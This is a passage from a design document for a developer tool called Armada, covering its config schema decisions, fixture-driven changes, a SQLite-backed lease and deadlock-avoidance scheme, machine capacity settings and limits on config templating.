`armada manifest check web:e2e`, `armada manifest check --component web`, `armada manifest check lint`.

`armada manifest up` starts every component with a `run:`. `armada manifest check` runs every component with
`checks:`.

### 4.1.1 What phase 1 decided, and what the fixtures forced

**This section is the record of phase 1**, which is the phase that turns §4.1 from prose into a
schema, six fixture configs and a golden resolved snapshot each. Two kinds of entry: five
things this document specified without settling, and every change the fixtures forced while
being written. The second kind is the more important — §8.1 of [`PHASES.md`](PHASES.md) says
zero fixture-forced changes would be a warning sign, not a success.

**Where the artifacts live.** The schema is `crates/core/schema/armada.schema.json`, embedded in
the binary with `include_str!` because phase 5 hands it to the agent that authors a config, and
a schema the binary has to find on disk is missing in the one situation it exists for. The
fixtures are `tests/fixtures/<name>/armada.yml` with `resolved.json` beside each. That location
is not incidental: `ARCHITECTURE.md` §2.4 exempts `tests/fixtures/` from the contamination
grep, and a resolved snapshot of `polyglot-web` necessarily contains that repo's directory
names.

#### The five things the spec did not decide

**1. `shell:` is one flag per *entry*, covering every command string that entry dispatches.**
An entry is a `setup:` step, a check, a `run:` block or a `commands:` entry. So a check's
`shell: true` covers both its `cmd:` and its `fix:`; a `run:` block's covers `cmd:` and
`stop:`. The alternative was `cmd`/`fix` as step-objects the way `setup:` entries are, and it
was rejected on one ground: it makes `cmd:` polymorphic — a string in five places and
`cmd: { cmd: …, shell: true }` in one — so an agent authoring a config has to ask which
spelling applies where. The object form earns its place under `setup:` because a *list* of
steps genuinely needs per-step data; nothing else does. The `${files}` prohibition also lands
more naturally at check level, because file-scoping is a property of the check rather than of
one of its two strings.

The cost, stated because it is real: `shell: true` for the sake of `fix:` also gives up
`argv[0]` resolvability on `cmd:`, which `config verify` then reports as `unchecked` (§5).
**Reversal condition:** the first fixture that needs a shell for one string and static
resolution for its sibling. None of the six does — `rails-monolith`'s `app:boot` needs a shell
for `&&` and declares no `fix:` at all.

**2. The JSON Schema is authoritative. Neither it nor the serde structs generates the other.**

| | |
|---|---|
| **Authoritative** | `crates/core/schema/armada.schema.json` |
| **Mirrors it** | the `serde` structs in `crates/core/src/config/model.rs` |
| **Keeps them together** | the fixture suite, not codegen |

The schema wins because it is the artifact with the most consumers: the agent authoring a
config in phase 5's layer 2 reads it before any Rust is involved, `config verify` runs it, and
it is language-independent in a way the structs are not.

Codegen in either direction was considered and rejected. Generating structs *from* the schema
produces types nobody would choose to review, and the schema's load-bearing rules are
cross-field `if`/`then` constraints no generator turns into Rust. Generating the schema *from*
the structs makes the shipped artifact a build product of an implementation detail, and Rust
attributes cannot express those same constraints either.

So drift is prevented by tests rather than by construction, and this is the part that matters:
every fixture is parsed by the structs **and** validated against the schema in the same run
(`deny_unknown_fields` on one side, `additionalProperties: false` on the other), a further test
asserts that **every property the schema declares is used by at least one fixture**, and a
negative suite asserts that both reject the same documents. A key that exists on only one side,
or that no repo shape asked for, fails the build.

**3. `workspaces.ports` is two inclusive integer columns, `port_from` and `port_to`.** §4.3
showed one column and §3.1's payload shows `{from, to}`; the payload was right. Claiming a
block is an overlap query — `WHERE port_from <= ? AND port_to >= ?` — which against a packed
string means parsing every row in the table to answer it, and a single text column invites a
format the writer and the reader spell differently. `port_to = port_from + port_block_size - 1`,
and the two columns map 1:1 onto the payload's `from` and `to`, so no conversion exists to get
wrong. Phase 2 builds this.

**4. `where` for a YAML parse error keeps the `bad_config` grammar: `armada.yml:` and then a
locator.** The locator is a dotted key path when Armada knows the key —
`armada.yml:components.api.run.cmd` — and `line:column` when the document did not parse far
enough to have one: `armada.yml:12:7`. There is no third grammar, because §3.1's rule is that the
*class* picks the grammar, and a parse error is a `bad_config` like any other.

Measured, and it is why this costs nothing: `serde_yaml_ng` reports a line and column for both
syntax errors and typed ones, and for a typed error its message already begins with the key
path (`components.web: unknown field 'nope'`). So the message carries the path when there is
one and `where` carries the position, which is the directly actionable half for an agent about
to edit the file.

**5. The YAML crate is `serde_yaml_ng` 0.10**, pinned once in the workspace's
`[workspace.dependencies]` and used by `crates/core` and by `xtask`'s doc lint alike. That is
the point of pinning it there rather than in two manifests: the lint parses the corpus's
examples with the parser that will actually read `armada.yml`, so a doc example Armada would reject
is a finding now rather than a discovery in phase 3.

It is a maintained fork of the deprecated `serde_yaml`, with the API this design needs —
`serde` derive, and `Error::location()` for decision 4. Two honest notes. It wraps
`unsafe-libyaml`; `#![deny(unsafe_code)]` is per-crate and does not reach a dependency, so that
is a trust decision rather than a guarantee. And it parses YAML 1.2 only, which is the known
limitation `xtask`'s block check already records.

#### What the fixtures forced

| Fixture | What it forced |
|---|---|
| `go-service` | **`match:` needed a stated default.** It is the only fixture with a component that declares neither `root:` nor `match:` — the component *is* the repo — and an unstated default is the per-implementer decision §4.1 opens by rejecting. Default: `<root>/**` when `root:` is set, `**` when it is not. |
| `pnpm-monorepo` + `polyglot-web` | **…and that default had to stop at components with no checks.** `polyglot-web`'s resolved snapshot showed `postgres` — a service with no source at all — claiming `**`. A component with no `checks:` now gets no globs: `match:` exists to scope checks, and a run-only component has nothing to scope. |
| `pnpm-monorepo` | **…and the nested-workspace half of that question turned out to belong to §4.6, not to the default.** The worry was that in a repo declaring a nested workspace a defaulted `**` reaches into it, so a config that never wrote a glob would fail `config verify` for a glob Armada invented. The first attempt was to subtract declared `workspaces:` from the defaulted glob set. That is not expressible: `match:` has no negation, and "everything here except `apps/site`" needs either a negative glob — inventing syntax, which phase 1 does not do — or the sibling names, which only the filesystem has, and a default that reads the filesystem is not a default. The premise was the thing that was wrong. A declared workspace is *excluded from this one*, so `**` in the parent already means "everything in this workspace" and reaches into nothing; §4.6 now says so, and scopes verify's overlap rule to a `root:` or glob that *names* a path inside a declared workspace. The default stays a pure function of `(root, checks)`. |
| `rails-monolith` | **`setup:` accepts a scalar or a list, and a list item may be a step object.** §4.1's examples show `setup: uv sync` and `setup: ["bundle install", …]`, so both spellings had to be legal; resolution normalises to one list of `{cmd, shell}` steps. The object form is where `shell: true` lives, which this fixture needs for `db:create \|\| true`. `owns.release:` takes the same scalar-or-list treatment, for the same reason. |
| `python-ml` | **`acquire_timeout` was too low, twice** — see §4.3. Its GPU check holds an `exclusive:` for 1800 s, which is longer than the `web:e2e` hold the ceiling had been sized against. |
| `multi-lang` | **`ready.exec:` is a command string, not free text.** It was going to be an unconstrained string; this fixture writes `pg_isready -q -h 127.0.0.1 -p ${port.pg}`, which is a command Armada dispatches and therefore subject to the same substitution rules as any other. |
| `pnpm-monorepo` | **`.` and `./` are rejected as spellings of the workspace root.** The nested config wanted `root: .`, which means exactly what omitting `root:` means. Two spellings for one idea is how a glob starts matching in one config and not in another. |
| `polyglot-web` | **The `commands:` shadowing list gained `explain`** (§4.5), and both of §4.5's "inference is wrong in both directions" cases got a real entry: a grant with `stdio: inherit`, and `stdio: pipe` with no grant. |

Two more changes came from encoding the contract rather than from a fixture, and both were
holes rather than choices: **`bad_invocation` was missing from §3.1's aggregation precedence**,
which left the maximum undefined for a run mixing it with a test failure; and **`env:` values
must be strings on both sides**, because the parser silently coerces an unquoted YAML scalar
into one — `DEBUG: null` would have loaded as the four-character string `null`, passed the
structs, and failed `config verify`. Both are measured or recorded in [`traps.md`](traps.md).

#### Which layer enforces what

The split matters more than any individual rule, because it decides where every future check
goes:

| Layer | Decides | Example |
|---|---|---|
| **schema** | anything readable from one value or one entry | a name's grammar, a port's range, `shell: true` beside `${files}` |
| **resolution** | anything needed to produce a typed value at all | a `driver:` with the wrong keys beside it; a `ready:` with two kinds |
| **`config verify`** | anything needing a second part of the document, or the filesystem | `needs:` targets, duplicate port names, `argv[0]` on `PATH`, globs matching nothing |

Resolution deliberately does **not** re-check what the schema rejects. Duplicating a rule is
how two implementations of it drift apart, and both run over every fixture in the suite, so a
gap between them shows up as a failing test rather than as a config that loads and then
misbehaves.

One consequence worth stating plainly: **loading a config is not verifying it.** Phase 2 reads
`armada.yml` through parse and resolve, and no schema runs at that point. That is why the
negative suite asserts the *core* rejects everything it cannot turn into a typed value, rather
than leaning on the schema to catch it later.

**One rule the schema cannot express, and why it is verify's.** §4.4 caps substitution at four
names, so an unrecognised `${…}` under argv-split is `bad_config`. Stating that as a pattern
needs negative lookahead, and Armada validates with a Rust regex engine that has none — an
expression using it would pass in one validator and misbehave in Armada's own. Every pattern in
the schema is therefore lookaround-free, and this one rule moves to `config verify`, which can
simply scan.

#### Keys deliberately not added

- **`parse:`** — §4.7 mentions "any `parse:` keys" in passing, but nothing in this document
  defines one and no fixture needs one. A key that exists only in a subordinate clause is not a
  key.
- **`stdio: pty`** — reserved and not built (§4.5). No fixture needs it, so the enum has two
  members.
- **`once:` on a setup step** — removed in §4.1 with its reasoning; not reintroduced.

### 4.2 `.armada/` — gitignored, and deliberately holds nothing reclaimable

```
.armada/
  logs/<component>.log            services — `up` is not a run, so it has no run-id
  run/<run-id>/
    state.json                    per-check status, verdict, and the dispatch
                                  record §3.4 reads — written when the check
                                  runs, because most of it cannot be recovered
                                  afterwards
    logs/<component>.<check>.log  checks
```

**Services log outside `run/`** because `armada manifest up` is not a run and has no run-id. An earlier
draft gave the only log path as `run/<run-id>/logs/`, which left `armada manifest status` reporting a
crashed service with nowhere to point.

**One rule decides what may live here: if losing it would leak a resource, it does not belong
in `.armada/`.** A workspace directory is deleted by `rm -rf` or `git worktree remove`, neither
of which consults Armada — so anything recorded only here is gone precisely when it is most
needed. Run artifacts are safe because a run without its workspace is meaningless anyway.

An earlier draft put `owned.json` here — container ids, networks, **pids**. That was the
defect: delete the directory and the record of what to reclaim died with it, reproducing the
plan's own motivating bug. Containers and networks survived it only by accident, because they
carry a `armada.workspace=<id>` label and are findable without any record at all. Pids are not.
Everything reclaimable now lives in §4.3.

`armada manifest clean` removes `.armada/` entirely; `armada manifest init` recreates it. **`clean` releases
resources; it does not undo installation.** An earlier draft said it returns the workspace to
its "pre-init state", which overclaims — `node_modules` and a populated `.venv` survive, by
design, unless `--artifacts` is passed (§6.1). `armada manifest clean` is not `git clean -xfd` and should
not read as if it were. **Log growth is a separate
problem with a separate answer** — coupling retention to `clean` would mean either logs live
forever or you lose the evidence from a failed run the moment you release a port. At the start
of each run Armada reaps old run directories, keeping the most recent N and never touching one
whose run lease is live. N is configurable; its default is a convention, not a measurement.

### 4.3 `~/.armada/manifest.db` — machine-global, SQLite

The only cross-workspace state, and the only thing that survives a workspace directory being
deleted.

```
workspaces   id, path, project, port_from, port_to, claimed_at
                 two integer columns, inclusive — see §4.1.1 decision 3
owned        workspace, kind, ref, boot_id, pid_started_at
                 kind = container | network | volume | image | pgid
leases       workspace, kind, key, heartbeat_mono, boot_id, pid, pid_started_at
                 kind = run | machine | cpu-slot | exclusive
                 `machine` rows carry a NULL workspace — see clean --all (§3.3)

PRAGMA user_version = 1        written at creation; see below
```

**`heartbeat_mono` is a suspend-excluding monotonic reading, and naming the semantics matters
more than naming a constant.** `CLOCK_MONOTONIC` means opposite things on the two platforms
this project supports: measured on darwin it counted **4.4 days of sleep** on this machine,
while Linux's excludes suspend. The one Armada wants is the one that does *not* advance while the
machine is suspended — because the lease holder was not running either, so its heartbeat should
not age. Rust's `Instant` already picks correctly on both (`CLOCK_UPTIME_RAW` on darwin,
`CLOCK_MONOTONIC` on Linux, verified), so the rule is **`Instant` semantics**, and a `libc`
call only because an `Instant` cannot be stored in a column. That is a **fourth** `unsafe`
call, in the same POSIX module as the other three, and it is why the count is four rather than
three.

Getting this backwards is not a small error: the sleep-counting clock makes a live holder look
arbitrarily cold after a laptop resumes, which is the two-workspaces-one-mutex outcome this
section rejected a TTL to avoid. `ARCHITECTURE.md` §1.1 gives `now` three jobs and one of them is heartbeat staleness — but a
backwards NTP step makes a live holder's heartbeat look cold on a wall clock. `claimed_at`
stays wall clock because it is only ever displayed. Monotonic readings are meaningless across a reboot, which is what `boot_id` is for.

**`boot_id` and `pid_started_at` are what make a pgid reclaimable.** Sources, because "boot
id" is not a portable concept: `sysctl kern.bootsessionuuid` on darwin (verified present and
stable; there is no `/proc/sys/kernel/random/boot_id`) and `/proc/sys/kernel/random/boot_id` on
Linux. `pid_started_at` comes from `ps -o lstart` on darwin, which is 1-second resolution — so
pid reuse inside the same second is undetectable, and the check is a strong filter rather than
a proof. Without them, every
`owned` pgid row survives a reboot as an unreclaimable "possible leak" that `status --all`
reports forever, because Armada cannot tell a recycled pid from its own. With them it can: a row
whose `boot_id` is not the current one is stale by definition, and a live pid whose start time
differs from the recorded one is a different process. That turns "report forever" into "reap
safely", and it is the same liveness cross-check that makes a lease's `pid` trustworthy.

**`user_version` is also the compatibility check, and the rule is deliberately one-directional:
a newer `manifest.db` is readable by an older `armada` only if the older one recognises the version.**
`~/.armada/manifest.db` is machine-global and long-lived, so a machine running two Armada versions —
one repo pinned, one fresh — is normal rather than exotic. An older binary meeting a higher
`user_version` fails `environment` and says which version wrote it; a newer binary meeting a
lower one migrates it forward in a single `BEGIN IMMEDIATE`, additively. Schema changes are
additive for the whole 0.x line: new column, never a dropped or retyped one.

**`armada manifest clean --orphaned --force-rebuild` is the way out of a database Armada cannot read.** The
recovery path must not need the thing that is broken. It ignores `manifest.db` entirely, enumerates
by label alone — `armada.workspace_path` is a real path and `stat` still works — reaps what is
unambiguously dead, and writes a fresh database. It is the one operation that trusts labels
over rows, which is why it is explicit rather than automatic.

**`PRAGMA user_version` is a presence sentinel, and it exists because the failure it catches is
silent.** Measured: delete `manifest.db` while a process holds it open under WAL and that process
keeps reading and writing a consistent world through the unlinked inode, while the next process
creates a fresh file at the same path and hands out a port block the first one already holds.
Neither errors. A zero-length `manifest.db` — an interrupted write, a synced-home conflict copy —
is worse still: it reports `no such table`, which is indistinguishable from a fresh install. **The holder detects this; the newcomer cannot.** Measured, and it bounds what the sentinel
can do: to the second process the unlinked case reports `user_version=0` and `no such table` —
byte-identical to a genuine fresh install and to a zero-length file. There is no discriminating
bit available to it, so a sentinel check there would either be a no-op or would refuse every
real first run.

What *is* available is on the holder's side: `fstat` on its own open handle returns
`st_nlink == 0` once the file is unlinked — measured. So **a long-running verb re-checks
`st_nlink` on each loop iteration and ends `environment` when it hits zero**, which stops the
divergence at the process that can actually see it. The newcomer proceeding as a fresh install
is then correct rather than merely unavoidable: by the time it matters, the holder has stopped.

The bind probe does not save you either — a workspace that ran `init` then `down` holds its
block with nothing bound.

The `project` column is the whole implementation of `--project`: filter by it, then read the
`owned` rows. Claims are idempotent by workspace id.

#### Why SQLite rather than a JSON file

Because of **leases**, and leases exist because `armada manifest check` runs for a long time. A ten-minute
test suite is normal in a large repo, and during those ten minutes the run holds machine-wide
claims that renew a heartbeat every few seconds. Rewriting an entire JSON document under an
`O_EXCL` lockfile, five workspaces at a time, for the whole of a ten-minute run, is the wrong
shape for that write pattern — and it is exactly where [`PHASES.md`](PHASES.md) §11's registry-corruption risk lives.
SQLite is stdlib, one file, needs no daemon, and makes that risk largely disappear.

#### Connection setup is not optional

Three settings, every connection, no exceptions — see [`traps.md`](traps.md) for the
measurements behind each:

```rust
conn.pragma_update(None, "journal_mode", "WAL")?;   // property of the file, never a default
conn.pragma_update(None, "busy_timeout", 5000)?;    // driver defaults vary, some are 0
// and every transaction that may write:
let tx = conn.transaction_with_behavior(TransactionBehavior::Immediate)?;
```

`TransactionBehavior::Immediate` is a typed argument rather than a connection-string flag,
which is one of the reasons the language decision landed where it did (§10.1) — the obvious
API is the correct one. A DEFERRED transaction that reads and then writes fails after **0 ms**
with `SQLITE_BUSY_SNAPSHOT`, which `busy_timeout` cannot rescue because the reader's snapshot
is already stale. That is the lease pattern exactly.

#### Leases: how long-running work holds machine-wide claims

```
acquire   insert a lease row
hold      renew the heartbeat from the shell's event loop

          INVARIANT: the shell's event loop never blocks. It selects over child
          output, timers and signals; it never waits on a child, never holds a
          SQLite transaction across a poll, and never calls a blocking read.
          Child waiting is a non-blocking reap. This is what makes "wedged but
          still heartbeating" unrepresentable rather than merely unlikely: a
          wedged loop is a loop that stopped selecting, and a loop that stopped
          selecting stopped renewing. Every blocking call added to that loop
          weakens the reclaim guarantee, so it is a review rule, not a style
          preference.
release   delete the row on exit
reclaim   a lease whose heartbeat has gone cold is dead — take it
          COLD = 60 monotonic seconds without a renewal, against a renewal
          interval of 5s. Twelve missed renewals, because the cost of being
          wrong is a stolen exclusive and the cost of waiting is one minute.
          This is not a TTL: it bounds silence, not the hold.
```

**Renewal happens in the shell loop that steps the reducer — not a background timer.** That
single placement decision is what makes a hard TTL unnecessary. A background timer keeps
ticking while the scheduler is wedged, so the lease looks healthy forever and you need an
expiry to catch it; a loop-driven heartbeat simply stops, and the existing cold-heartbeat path
handles it.

The loop already exists: §1.2 of `ARCHITECTURE.md` has the shell sleeping until the next
deadline computed from state, so it wakes on a schedule regardless of how long any child runs.
A thirty-minute check does not stall it.

**There is deliberately no TTL.** An earlier draft added one for "wedged but still
heartbeating", and no value can work: the fixtures contain a 1800-second check and a
900-second `e2e` holding `exclusive: [browser]`, so a TTL long enough not to fire on a healthy
job is useless as wedge detection — and when it fires wrongly on an exclusive, **two
workspaces hold one mutex with no error anywhere.** That is worse than the visible hang it
replaces, and it repeats the mistake §2.3.1 avoids for orphaned pgids: acting on state Armada
cannot prove is stale.

A wedged holder therefore blocks until killed, and `armada manifest status --all` names it and how long it
has held. **Residual gap, stated rather than papered over:** a loop that keeps turning while
achieving nothing is an Armada bug, not a wedge, and no lease mechanism catches it.

**The run lease covers `init`, `up`, `down`, `clean`, `check` and every `commands:` entry —
everything that mutates.** `commands:` entries are included because they declare `owns:`
selectors that `clean` later deletes; without the lease, `armada worktrees clean` and `armada manifest clean`
run concurrently over the same resources.

**`--status` and `--dry-run` take no lease, on any verb.** They read. Excluding them is not a
nicety: `--status` is a flag on `check`, and the documented remedy for "a run is already in
flight" is *`armada manifest check --status` to watch it* — which the lease would have made fail fast with
exit 2 in the only situation it is for. One per workspace, taken for the duration. Two agents in the same worktree is
the ordinary case this project assumes, and without it their `init` runs interleave setup steps
against the same tree, or one's `clean` tears down what the other's `up` is mid-way through
starting. `status` takes nothing: it reads.

**A verb that cannot take the run lease fails fast rather than queueing** (§3.2.1), naming the
holder — because unlike a cpu-slot, waiting on it means waiting for an entire other run, and
the caller almost always wants to know rather than to wait. `check --wait` is the opt-in.

This is the pattern §4.2 previously used for the run lock — pid plus heartbeat — moved
machine-global so it outlives the directory. Crash recovery falls out of it: a runner that
dies stops renewing, and the next claimant reclaims. So does the deleted-mid-run case: the
lease is in `~/.armada/`, still visible and still reclaimable.

#### Contention: what blocks, what fails fast, and why they differ

| Lease | The question it answers | Behaviour |
|---|---|---|
| **run lease** | "is another run already going in *my* workspace?" | **Fail fast** (§3.2.1) — you probably did not mean to start a second one |
| **cpu-slot** | "is the machine busy?" | **Block.** A budget that errors instead of queueing is not a budget |
| **exclusive** | "is another workspace using the browser?" | **Block** — and this is where the wait can be long |

An earlier draft applied §3.2.1's fail-fast rule to the run lease and left the resources it
was reasoned *about* unaddressed, which reintroduced the silent wait across workspaces. The
defect was never blocking; it was blocking **invisibly and without a ceiling**.

So a waiting check is **visible in the payload**, naming what it waits on and who holds it:

```json
{ "id": "web:e2e", "status": "WAITING",
  "waiting_on": { "exclusive": "browser", "held_by": "7c21ab90", "since_ms": 44000 } }
```

**`--wait` is exempt from the ceiling.** `acquire_timeout` bounds waits Armada imposes — a
cpu-slot, an exclusive — because those are queueing the caller never asked for. `--wait` is the
caller asking, and the fixtures contain a 1800-second check, so a 900-second ceiling would turn
"queue behind that run" into "fail `aborted` after fifteen minutes" for a run behaving exactly
as specified. `--wait` blocks reporting `WAITING` until the lease is free or the caller
interrupts.

**The ceiling is 40 minutes of cumulative waiting per check, and it is configurable** —
`acquire_timeout` in `~/.armada/machine.yml` (§4.3.1), machine-global like everything else about
resource budget. It counts time spent waiting to acquire, not time spent running; a check that
waits 14 minutes and then runs for an hour is not affected. It exists so that an abandoned
lease whose holder died between heartbeat and reap cannot hang a merge gate indefinitely, and
it is sized against the longest legitimate exclusive hold in the fixture set. So the ceiling
must be **strictly greater** than that hold: `acquire_timeout` is **2400**.

**The figure has now been wrong twice, in the same way, and the fixtures caught it both
times.** An earlier draft set it to 900 and justified it with "~6 minutes", a figure no fixture
supported. It was then raised to 1200, sized against `web:e2e` at `timeout: 900` — but
`python-ml`'s `train:test` holds `exclusive: [gpu]` for `timeout: 1800`, which is longer, and
that fixture was written after the number was chosen. A ceiling of 1200 fires on a healthy GPU
training run, with the **retryable** class, telling a merge gate to try again on a machine that
is behaving exactly as its own fixture specifies.

**The rule, so a third fixture does not repeat this:** `acquire_timeout` must exceed the
longest `timeout:` of any check declaring an `exclusive:`. Adding a longer one is a change to
this number, and the fixture set is where that shows up.

After it expires the check fails with a **retryable** class:

```
status: FAILED   error.class: aborted   "browser held by 7c21ab90 for 20m"
```

That is the shape SQLite itself uses, measured in [`traps.md`](traps.md): a contending writer
waits the full `busy_timeout` and then fails with `SQLITE_BUSY` (5), which is retryable —
distinct from `BUSY_SNAPSHOT` (517), which arrives in microseconds and is not.

**Three more extended codes arrive through the identical error type and mean something else
entirely.** `SQLITE_FULL` (13), `SQLITE_CANTOPEN` (14) and `SQLITE_CORRUPT` (11) are all class
`environment` — the machine is broken, not the config and not the tool. Branch on the extended
code, never the message, and never let one of these fall into the retry path that 5 belongs to:
retrying a claim against a full disk is an infinite loop.

**Under a full disk the system looks healthy from the lease's point of view**, which is why
this needs saying. Measured: a claim fails with `SQLITE_FULL` while a *smaller* subsequent
write still succeeds — so heartbeats keep renewing, nothing looks stale, nothing gets reclaimed,
and every new claim fails. Report `environment` on the first `SQLITE_FULL` rather than treating
it as contention.

**Corruption is not detected where you would expect it.** Measured: `BEGIN IMMEDIATE` succeeds
on a corrupt file and `SQLITE_CORRUPT` surfaces only when the damaged page is touched — so a
lease acquire can get part-way in. Treat it as `environment` wherever it appears rather than
assuming a clean transaction boundary.

#### Deadlock is prevented by construction, not detected

Once exclusives are machine-wide, a cycle spans **processes**: workspace A holds `browser` and
wants `gpu` while B holds `gpu` and wants `browser`. Neither ever releases, because release
happens when work *finishes* and neither can *start*.

**The reducer cannot catch this.** `step(state, event)` models one run; run A's state machine
has no idea run B exists, so no unit test can construct the cycle. `ARCHITECTURE.md` §1.2's argument was that
making the scheduler a reducer puts deadlocks within reach of a unit test — this particular
deadlock crawled out of that reach when the resources went machine-wide.

> **Rule: acquire `exclusive:` first, in sorted name order, then `cost:` slots — and never
> hold a slot while waiting on an exclusive.**

**Both halves matter, and an earlier draft only had the first.** Sorting orders exclusives
against each other, but `cost:` slots are *also* machine-wide leases and were outside that
order — so A could hold eight slots and wait on `browser` while B held `browser` and waited on
slots. A cycle across two lease *classes*, untouched by sorting them within one. The proof
below holds only inside a totally-ordered class, and it was asserted across all of them.

Acquiring exclusives first closes it: a run waiting on an exclusive holds **nothing** a
slot-waiter needs. Release in reverse.

That makes a cycle impossible rather than unlikely, **for every possible interleaving**. If a
worker waits for X, everything it holds is below X — it acquires upward and has not reached X.
Follow a supposed cycle and the awaited resource strictly increases at each step, so returning
to the start would require X > X. No step in that argument mentions speed, arrival order or
scheduling, which is why it is preferred over detection: timing cannot defeat it.

**Verified by a cross-process integration test**: two real processes declaring the same two
exclusives in opposite order must both complete. Without the sorting they hang — which is the
point of testing it, since the rule is easy to write down and easy to forget.

**What ordering deliberately does not fix**, and what does:

| Failure | Handled by |
|---|---|
| Two workers stuck on each other forever | sorted acquisition — no recovery exists, so it must be impossible |
| B waits fifteen minutes for A's slow suite | not a failure; `WAITING` plus `waiting_on.held_by` makes it visible and attributable rather than silent |
| A crashes holding `browser` | heartbeat expiry |
| A is wedged but its heartbeat still ticks | **cannot happen, given the invariant below** |

**`cost:` and `exclusive:` are machine-wide, not per-run.** Ports were already claimed
machine-globally; CPU slots and named exclusives were not, which meant five concurrent
workspaces each granted themselves the full CPU budget and each granted themselves the same
browser or GPU. With ten-minute runs that is sustained 5× oversubscription rather than a brief
overlap, on exactly the "five agents on one machine" case §2.1 calls the one that matters.

#### Why not a daemon

A daemon would buy one thing this does not: **prompt** reaping, seconds after a directory
vanishes rather than at the next `armada manifest init`. Everything else it offers, a lease already
provides — and it does so without a background process to install, upgrade, crash-recover, or
answer "is it running?" for, and without a `curl | sh` bootstrap that has to install a
service.

The reason Armada does not need one is that **the work process is already long-lived.** A
detached `armada manifest check` exists for exactly as long as its run, so it can hold and renew its own
leases. There is no state that outlives all Armada processes and therefore nothing for a
resident daemon to hold. (Contrast a tool whose pipeline outlives every command that touches
it — that shape genuinely needs a daemon. Armada's does not.)

### 4.3.1 `~/.armada/machine.yml` — machine capacity, never committed

```yaml
cpu_slots: 6            # default: max(1, num_cpus - 2)
port_block_size: 10
run_retention: 10       # runs kept; see the 10 MB per-check log cap (§3.1)
check_timeout: 900      # per-check default, overridable per check (§4.1)
acquire_timeout: 2400   # cumulative wait for leases before FAILED/aborted (§4.3)
docker_timeout: 30      # Armada's own deadline on every docker call (§6)
```

**`armada.yml` declares how expensive a check is; this file declares how much the machine has.**
They cannot be the same file: `armada.yml` is committed, and a repo cannot know your core count.
Three settings were previously described as "configurable" with no key and no home — this is
the home.

**YAML, and it was TOML until M1.** The file was called `config.toml` then, and carrying a
second document language for six integers meant a second parser in the dependency graph and a
second set of quoting rules for whoever edits either file. One language, one parser
(§4.1.1 decision 5). There are **no sections**: unlike `armada.yml` this file is one flat
mapping, because it describes a machine rather than a stack of modules.

**`cpu_slots` defaults to `num_cpus - 2`, not `num_cpus`.** A budget that permits full
saturation makes the machine feel dead even while the work is correctly bounded, because the
editor, the agent processes and Armada itself all need something. Two agents running `armada manifest check`
concurrently then contend for **one** pool rather than each assuming a whole machine — which is
the machine-wide lease (§4.3) doing its job, and is impossible until this number exists.

`armada manifest check --concurrency N` overrides it for a single run.

### 4.4 Templating: four substitutions plus two scoped placeholders, hard cap

**Everywhere:** `${port.NAME}`, `${files}`, `${component.root}`, `${workspace.id}`.

**Two scoped placeholders, each legal in exactly one place and nowhere else:**

| Placeholder | Legal only in | Unset / unmatched |
|---|---|---|
| `${env.NAME}` | `env:` blocks | `bad_config`, naming the variable |
| `${ref}` | `secret_providers[].cmd` (§4.7) | schema error — a provider `cmd` without it can never resolve anything |

**The cap says what Armada *substitutes*, not what may appear.** Under `shell: true`,
`${HOME}` is ordinary shell syntax and Armada passes it through **untouched** — banning it would
mean Armada policing a language it explicitly declined to parse. Under argv-split, which is the
default, an unrecognised `${…}` is `bad_config`: nothing would ever expand it, so it can only
be a typo or a placeholder someone expected Armada to know. One rule, two behaviours, and the
behaviour follows from whether anything downstream can interpret it:

| | `${port.api}` | `${HOME}` |
|---|---|---|
| argv-split (default) | Armada substitutes | **`bad_config`** — nothing expands it |
| `shell: true` | Armada substitutes | passed through; the shell expands it |

`${ref}` is listed here because an earlier draft introduced it in §4.7 without adding it to
the cap this section spends forty lines defending. It is a provider-template placeholder, not
a general substitution: it is substituted with the part of a secret reference following the
scheme, and it means nothing anywhere else.

**No conditionals, no loops, no expression language.** `${env.NAME ?? "default"}` is
rejected by the schema, not merely undocumented.

The reason is not parser cost — it is that requests arrive one at a time, each individually
reasonable, with no natural stopping point: `${port.api}` → `${env.CI ?? 0}` → `{{#if}}` →
`{{#each}}` → a language with no debugger, no types, and no stack traces, whose bugs are
yours to diagnose from a YAML file at the exact moment an agent is blocked.

**Why the line sits here rather than at three.** `${workspace.id}` was never really outside
the cap — §6.1's `owns:` example already used it, so the plan contradicted itself. And a
*bare* `${env.NAME}` is structurally a lookup from a namespace, exactly like `${port.api}`:
there is no operator and nothing to evaluate. The slope in the paragraph above does not begin
at the read — it begins at `??`, because the moment the read exists someone asks "what if it
is unset," and that question has precisely two answers: a default operator, or a loud error.

**So the error is the stopping point, and it has to stay one.** Unset is `bad_config`, exit
3, naming the variable. That is what makes this a resting place rather than a first step.

**One cost, accepted knowingly.** `${env.NAME}` makes `armada.yml` environment-dependent —
`config verify` can check that the reference is syntactically valid, but it cannot know
whether the variable will exist on another machine, so a config can verify locally and fail
in CI. Every other part of this file means the same thing everywhere. That is the price of
the read, and it is why the read is confined to `env:` blocks.

**Do not reach for `${env.NAME}` for secrets.** It requires the value to be in the ambient
environment already, which in practice means a `.env` file or a shell `export` — a file or a
history an agent can read. That moves the leak earlier rather than removing it. Secrets have
their own mechanism (§4.7).

**Escape hatch for repos that genuinely need more:** write a generator script that *emits*
`armada.yml`, committed and diffable. This is deliberately the same pattern as cdktf → Terraform
JSON.

> **Armada does not verify that a generated file is in sync, and has no `generated_by:` key.** An
> earlier draft added one, with `config verify --check` re-running the generator and comparing
> byte for byte. Three problems: it made `verify` execute an arbitrary repo command **in order to
> read the config**, which is the exact property §4.4 uses to reject Starlark; byte comparison fails on a formatter bump or
> a generated timestamp while the config is perfectly correct; and `--check` had no coherent
> meaning, since `verify` never modifies anything. A repo that generates its config keeps it in
> sync the way it keeps any generated file in sync — in its own CI. This is deliberately the same pattern as cdktf → Terraform JSON.

> **Considered and rejected: a Tiltfile-style Starlark config.** It is the strongest
> objection to the above — jumping straight to a real evaluator means you never *invent*
> conditionals, you inherit them, so there is no slope to slip down. It loses on one
> specific ground, and it is the ground this project stands on: the primary author and
> reader of this file is an agent. YAML can be schema-constrained on write and parsed on
> read; Starlark must be *executed* to know what it means.
>
> **The distinction, since verify's pass 2 does run repo code (§5):** pass 2 runs the commands
> the config *declares*, which is precisely what `armada manifest check` does — running them is the point,
> and a repo's own checks are trusted by definition. Starlark would mean executing repo code to
> learn **what the config says at all**. That kills pass 1: there is no static pass over a
> program, so the schema constrains nothing, `armada manifest agents-md` cannot render without evaluating,
> and the seconds-long feedback loop that makes layer 3 usable disappears. The cheap pass is
> the one worth protecting.

### 4.5 `commands:` — repo-local verbs Armada does not own

The six verbs are universal. Every repo also has commands that are **only** meaningful in
